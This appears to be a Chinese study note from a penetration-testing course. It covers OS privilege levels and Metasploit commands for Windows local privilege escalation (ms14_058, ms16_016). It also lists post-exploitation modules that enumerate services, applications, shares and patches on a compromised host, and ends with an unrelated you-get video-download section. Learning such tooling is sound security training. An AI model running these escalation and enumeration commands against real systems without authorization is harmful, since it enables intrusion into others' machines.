# 渗透测试基础10

# 操作系统权限及密码破解（操作系统权限、计算机组成权限、利用msf对Windows操作系统的提权漏洞、利用msf对目标信息采集、流媒体数据包you-get捕获）

## 操作系统权限：

### windows:
system
administrator
(others)

### linux:
root
(others)



## 计算机组成相关权限

**CPU:**
**OS**（操作系统——可以在其身上安装其他软件的软件，需要配合硬件）
**ring0** 权限（驱动程序）——需要学习windows ddk
**ring3** 权限（大多数软件）



**usb接口**（硬件）

**硬件编程**



## 操作系统提权：
msf：

```
ms14_058,ms16_016
# 目标x32位系统

use exploit/windows/local/ms14_058...
show options
set session 1
exploit
# 如果使用成功会返回一个新的session号
```



较出名漏洞：

cve
cnnvd

......

![image-20220109234619923](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220109234619923.png)









## 目标信息采集：

msf

需要进入到一个sessions里

```
run post/windows/gather/forensics/xxxxx  # 取证模块

run post/windows/gather/checkvm   # 检测是否为虚拟机

run post/windows/gather/enum_services   # 查看运行的服务

run post/windows/gather/enum_applications   # 查看电脑安装了哪些应用

run post/windows/gather/enum_shares    # 查看共享

run post/windows/gather/dumplinks   # 查看最近操作（安装东西）

run post/windows/gather/enum_patches   # 查看用户安装了哪些补丁
```



```
cd /usr/share/metasploit-framework/scripts/resource/   #可以看到大佬的脚本
```



```
run scraper   # 导出所有信息

run winenum   # 搜集系统环境变量
```



## 数据包you-get捕获：

流媒体，很难搞
安装python环境

```
pip install -i https://pypi.doubanio.com/simple you-get

you-get -i [视屏地址]

看到视频所有支持的格式
按照提示去下载视频
```
